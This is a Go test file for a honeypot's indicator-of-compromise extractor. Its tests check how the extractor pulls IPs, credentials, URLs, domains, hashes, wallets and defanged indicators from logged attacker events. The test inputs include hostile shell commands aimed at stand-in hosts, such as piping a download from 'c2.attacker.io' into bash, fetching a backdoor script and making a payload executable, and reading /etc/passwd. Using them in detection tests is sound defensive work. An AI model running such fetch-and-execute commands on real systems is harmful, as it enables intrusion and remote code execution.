package intelligence

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func makeIOCEvent(sourceIP, eventType, command string, meta map[string]string) *database.Event {
	return &database.Event{
		Timestamp: time.Now().UTC(),
		Honeypot:  "cowrie",
		SourceIP:  sourceIP,
		EventType: eventType,
		Command:   command,
		Metadata:  meta,
	}
}

func findIOCByType(iocs []*database.IOC, t string) *database.IOC {
	for _, ioc := range iocs {
		if ioc.Type == t {
			return ioc
		}
	}
	return nil
}

// ---- private IP filtering ----

func TestExtractSkipsPrivateIPv4(t *testing.T) {
	private := []string{
		"10.0.0.1", "10.255.255.255",
		"172.16.0.1", "172.31.255.255",
		"192.168.0.1", "192.168.255.255",
		"127.0.0.1", "127.255.255.255",
		"169.254.0.1", "169.254.255.255",
	}
	e := NewExtractor()
	for _, ip := range private {
		ev := makeIOCEvent(ip, "connection", "", nil)
		iocs := e.Extract(ev)
		for _, ioc := range iocs {
			if ioc.Type == IOCTypeIP {
				t.Errorf("private IP %s should not be extracted as IOC", ip)
			}
		}
	}
}

func TestExtractSkipsIPv6Private(t *testing.T) {
	private := []string{"::1", "fc00::1", "fe80::1"}
	e := NewExtractor()
	for _, ip := range private {
		ev := makeIOCEvent(ip, "connection", "", nil)
		iocs := e.Extract(ev)
		for _, ioc := range iocs {
			if ioc.Type == IOCTypeIP {
				t.Errorf("private IPv6 %s should not be extracted as IOC", ip)
			}
		}
	}
}

func TestExtractPublicIP(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "connection", "", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeIP)
	if found == nil {
		t.Fatal("expected public IP IOC, got none")
	}
	if found.Value != "203.0.113.1" {
		t.Errorf("got IP %q, want 203.0.113.1", found.Value)
	}
}

// ---- credential extraction ----

func TestExtractCredential(t *testing.T) {
	e := NewExtractor()
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.1",
		EventType: "login_failed",
		Username:  "admin",
		Password:  "Password123!",
		Timestamp: time.Now().UTC(),
	}
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeCredential)
	if found == nil {
		t.Fatal("expected credential IOC, got none")
	}
	if found.Value != "admin:Password123!" {
		t.Errorf("unexpected credential value %q", found.Value)
	}
}

func TestExtractNoCredentialWhenMissingPart(t *testing.T) {
	e := NewExtractor()
	// Username only — no password
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.1",
		EventType: "login_failed",
		Username:  "admin",
		Timestamp: time.Now().UTC(),
	}
	iocs := e.Extract(ev)
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeCredential {
			t.Error("should not extract credential when password is missing")
		}
	}
}

// ---- URL + domain extraction ----

func TestExtractURL(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command",
		"wget http://malicious.example.com/backdoor.sh -O /tmp/bd", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeURL)
	if found == nil {
		t.Fatal("expected URL IOC, got none")
	}
}

func TestExtractDomainFromURL(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command",
		"curl -s https://c2.attacker.io/stage2.bin | bash", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeDomain)
	if found == nil {
		t.Fatal("expected domain IOC, got none")
	}
	if found.Value != "c2.attacker.io" {
		t.Errorf("unexpected domain %q", found.Value)
	}
}

// TestExtractIPLiteralURLHostIsIP guards the fix for an IP-literal URL host
// (http://203.0.113.9/x) being mistyped as a domain IOC. It must be classified
// as an IP, and never appear under the domain type.
func TestExtractIPLiteralURLHostIsIP(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("198.51.100.7", "command",
		"wget http://203.0.113.9/x.sh -O /tmp/x.sh", nil)
	iocs := e.Extract(ev)

	for _, i := range iocs {
		if i.Type == IOCTypeDomain && i.Value == "203.0.113.9" {
			t.Error("IP-literal URL host was extracted as a domain IOC")
		}
	}
	// The URL host 203.0.113.9 must be present as an IP IOC.
	var hostAsIP bool
	for _, i := range iocs {
		if i.Type == IOCTypeIP && i.Value == "203.0.113.9" {
			hostAsIP = true
		}
	}
	if !hostAsIP {
		t.Error("expected the IP-literal URL host 203.0.113.9 as an IP IOC")
	}
}

// ---- hash extraction ----

func TestExtractSHA256(t *testing.T) {
	e := NewExtractor()
	sha256 := "a3f5c9e2b1d4f7890123456789abcdef0123456789abcdef0123456789abcdef"
	ev := makeIOCEvent("203.0.113.1", "command",
		fmt.Sprintf("echo %s | md5sum", sha256), nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeHash)
	if found == nil {
		t.Fatal("expected hash IOC, got none")
	}
}

func TestExtractHashNoDoubleCounting(t *testing.T) {
	// SHA256 is 64 hex chars. Make sure it isn't also extracted as MD5/SHA1.
	e := NewExtractor()
	sha256 := "a3f5c9e2b1d4f7890123456789abcdef0123456789abcdef0123456789abcdef"
	ev := makeIOCEvent("203.0.113.1", "command", sha256, nil)
	iocs := e.Extract(ev)
	hashCount := 0
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeHash {
			hashCount++
		}
	}
	if hashCount != 1 {
		t.Errorf("expected exactly 1 hash IOC, got %d", hashCount)
	}
}

// TestExtractSHA512 verifies a 128-hex SHA-512 (the hash modern threat-intel
// feeds and sha512sum droppers use) is captured exactly once as a hash IOC and
// not split into shorter hashes.
func TestExtractSHA512(t *testing.T) {
	e := NewExtractor()
	sha512 := strings.Repeat("ab", 64) // 128 hex chars
	ev := makeIOCEvent("203.0.113.1", "command",
		fmt.Sprintf("wget http://x.test/m -O m && sha512sum m # %s", sha512), nil)
	iocs := e.Extract(ev)
	var hashes []string
	for _, i := range iocs {
		if i.Type == IOCTypeHash {
			hashes = append(hashes, i.Value)
		}
	}
	found := false
	for _, h := range hashes {
		if h == sha512 {
			found = true
		}
	}
	if !found {
		t.Errorf("SHA-512 not extracted as a hash IOC; got hashes=%v", hashes)
	}
	// Must not be split into shorter hashes (the \b anchors keep lengths
	// disjoint): the only hash from a lone 128-hex token is the SHA-512 itself.
	ev2 := makeIOCEvent("203.0.113.1", "command", sha512, nil)
	n := 0
	for _, i := range e.Extract(ev2) {
		if i.Type == IOCTypeHash {
			n++
		}
	}
	if n != 1 {
		t.Errorf("a lone SHA-512 token produced %d hash IOCs, want 1", n)
	}
}

// ---- user agent ----

func TestExtractUserAgent(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "http_request", "", map[string]string{
		"user_agent": "Go-http-client/1.1",
	})
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeUserAgent)
	if found == nil {
		t.Fatal("expected user_agent IOC, got none")
	}
	if found.Value != "Go-http-client/1.1" {
		t.Errorf("unexpected UA %q", found.Value)
	}
}

// ---- command IOC ----

func TestExtractCommandIOC(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "command", "cat /etc/passwd", nil)
	iocs := e.Extract(ev)
	found := findIOCByType(iocs, IOCTypeCommand)
	if found == nil {
		t.Fatal("expected command IOC, got none")
	}
}

func TestExtractNoCommandIOCForNonCommandEvent(t *testing.T) {
	e := NewExtractor()
	ev := makeIOCEvent("203.0.113.1", "connection", "some data", nil)
	iocs := e.Extract(ev)
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeCommand {
			t.Error("command IOC should only be extracted for event_type=command")
		}
	}
}

// ---- stress ----

func TestExtractStress(t *testing.T) {
	e := NewExtractor()
	for i := 0; i < 10000; i++ {
		ev := &database.Event{
			Honeypot:  "cowrie",
			SourceIP:  fmt.Sprintf("203.0.113.%d", i%254+1),
			EventType: "command",
			Username:  fmt.Sprintf("user%d", i),
			Password:  fmt.Sprintf("pass%d", i),
			Command:   fmt.Sprintf("wget http://evil%d.com/payload && chmod +x payload", i),
			Timestamp: time.Now().UTC(),
		}
		iocs := e.Extract(ev)
		if len(iocs) == 0 {
			t.Errorf("iteration %d: expected IOCs, got none", i)
		}
	}
}

// TestExtractURLTrimsTrailingPunctuation guards that over-captured trailing
// shell punctuation is stripped so identical URLs dedupe to one IOC.
func TestExtractURLTrimsTrailingPunctuation(t *testing.T) {
	e := NewExtractor()
	ev := &database.Event{Honeypot: "cowrie", EventType: "command",
		Command: "wget http://evil.com/x.sh; curl http://evil.com/x.sh)", Timestamp: time.Now().UTC()}
	var urls []string
	for _, i := range e.Extract(ev) {
		if i.Type == IOCTypeURL {
			urls = append(urls, i.Value)
		}
	}
	for _, u := range urls {
		if strings.HasSuffix(u, ";") || strings.HasSuffix(u, ")") {
			t.Errorf("URL %q retains trailing punctuation", u)
		}
		if u != "http://evil.com/x.sh" {
			t.Errorf("URL = %q, want http://evil.com/x.sh", u)
		}
	}
}

// TestExtractFTPYieldsDomain guards that ftp:// URLs produce a domain IOC.
func TestExtractFTPYieldsDomain(t *testing.T) {
	e := NewExtractor()
	ev := &database.Event{Honeypot: "cowrie", EventType: "command",
		Command: "curl ftp://bad.org/payload", Timestamp: time.Now().UTC()}
	var gotDomain bool
	for _, i := range e.Extract(ev) {
		if i.Type == IOCTypeDomain && i.Value == "bad.org" {
			gotDomain = true
		}
	}
	if !gotDomain {
		t.Error("ftp:// URL did not produce the expected domain IOC bad.org")
	}
}

// TestExtractNoEmptyCommandIOC guards a fuzzer-found bug: a whitespace-only
// command has byte length > 3 but trims to empty, which previously produced a
// command IOC with an empty value.
func TestExtractNoEmptyCommandIOC(t *testing.T) {
	e := NewExtractor()
	for _, cmd := range []string{"    ", "\t\t\t\t", "  a  ", "\n\n\n\n"} {
		ev := &database.Event{Honeypot: "cowrie", EventType: "command", Command: cmd, Timestamp: time.Now().UTC()}
		for _, i := range e.Extract(ev) {
			if i.Type == IOCTypeCommand && strings.TrimSpace(i.Value) == "" {
				t.Errorf("command %q produced an empty-value command IOC", cmd)
			}
		}
	}
}

// TestExtractWallet verifies cryptocurrency wallet IOC extraction. BTC
// addresses are only emitted when their base58check checksum verifies (so
// random base58-looking strings are rejected); ETH addresses are recognized by
// the 0x + 40-hex form and normalized to lowercase.
func TestExtractWallet(t *testing.T) {
	e := NewExtractor()
	wallets := func(iocs []*database.IOC) []string {
		var out []string
		for _, i := range iocs {
			if i.Type == IOCTypeWallet {
				out = append(out, i.Value)
			}
		}
		return out
	}

	// Valid addresses must be extracted.
	valid := map[string]string{
		// Satoshi genesis P2PKH address.
		"download && send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa now": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
		// A valid P2SH address.
		"pay 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy": "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
		// Ethereum address (mixed case) -> lowercased.
		"transfer 0x52908400098527886E0F7030069857D2E4169EE7": "0x52908400098527886e0f7030069857d2e4169ee7",
	}
	for cmd, want := range valid {
		ev := makeIOCEvent("203.0.113.5", "command", cmd, nil)
		got := wallets(e.Extract(ev))
		found := false
		for _, w := range got {
			if w == want {
				found = true
			}
		}
		if !found {
			t.Errorf("command %q: wallet %q not extracted (got %v)", cmd, want, got)
		}
	}

	// Invalid base58check (last char mutated) must NOT be extracted.
	bad := []string{
		"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb", // genesis addr with bad checksum
		"3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLz", // P2SH with bad checksum
		"1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",  // base58-shaped but invalid checksum
	}
	for _, addr := range bad {
		ev := makeIOCEvent("203.0.113.5", "command", "curl x && echo "+addr, nil)
		if got := wallets(e.Extract(ev)); len(got) != 0 {
			t.Errorf("invalid BTC address %q was extracted as wallet IOC: %v", addr, got)
		}
	}

	// An ETH-looking 0x value must not be mistaken for a hash, and a bare
	// 40-hex SHA-1 must not be mistaken for a wallet.
	ev := makeIOCEvent("203.0.113.5", "command", "0x52908400098527886E0F7030069857D2E4169EE7 da39a3ee5e6b4b0d3255bfef95601890afd80709", nil)
	iocs := e.Extract(ev)
	if w := findIOCByType(iocs, IOCTypeWallet); w == nil {
		t.Error("expected an ETH wallet IOC")
	}
	gotHash := false
	for _, i := range iocs {
		if i.Type == IOCTypeHash && i.Value == "da39a3ee5e6b4b0d3255bfef95601890afd80709" {
			gotHash = true
		}
		if i.Type == IOCTypeWallet && strings.Contains(i.Value, "da39a3ee") {
			t.Error("SHA-1 hash misclassified as a wallet IOC")
		}
	}
	if !gotHash {
		t.Error("bare 40-hex SHA-1 was not extracted as a hash")
	}
}

// TestExtractRefang verifies defanged indicators (a universal threat-intel
// convention) are refanged before extraction, so IOCs in dropped scripts /
// notes are captured - while the command IOC keeps the original text.
func TestExtractRefang(t *testing.T) {
	e := NewExtractor()
	cases := []struct {
		cmd       string
		wantType  string
		wantValue string
	}{
		{"download from hxxp://evil[.]com/x.sh", IOCTypeURL, "http://evil.com/x.sh"},
		{"c2 at hxxps://bad[.]org/beacon", IOCTypeURL, "https://bad.org/beacon"},
		// defanged URL host with [.] / [dot] resolves to a domain IOC.
		{"wget hxxp://evil[.]com/m", IOCTypeDomain, "evil.com"},
		{"curl hXXps://c2[dot]bad[dot]org/x", IOCTypeDomain, "c2.bad.org"},
	}
	for _, tc := range cases {
		ev := makeIOCEvent("203.0.113.5", "command", tc.cmd, nil)
		var found bool
		for _, i := range e.Extract(ev) {
			if i.Type == tc.wantType && i.Value == tc.wantValue {
				found = true
			}
		}
		if !found {
			got := []string{}
			for _, i := range e.Extract(ev) {
				got = append(got, i.Type+":"+i.Value)
			}
			t.Errorf("command %q: expected %s IOC %q, got %v",
				tc.cmd, tc.wantType, tc.wantValue, got)
		}
	}

	// The command IOC must retain the ORIGINAL (defanged) text, not the refanged
	// copy - we don't rewrite what the attacker actually typed.
	ev2 := makeIOCEvent("203.0.113.5", "command", "curl hxxp://evil[.]com", nil)
	var cmdVal string
	for _, i := range e.Extract(ev2) {
		if i.Type == IOCTypeCommand {
			cmdVal = i.Value
		}
	}
	if !strings.Contains(cmdVal, "hxxp://evil[.]com") {
		t.Errorf("command IOC should preserve original defanged text, got %q", cmdVal)
	}
}
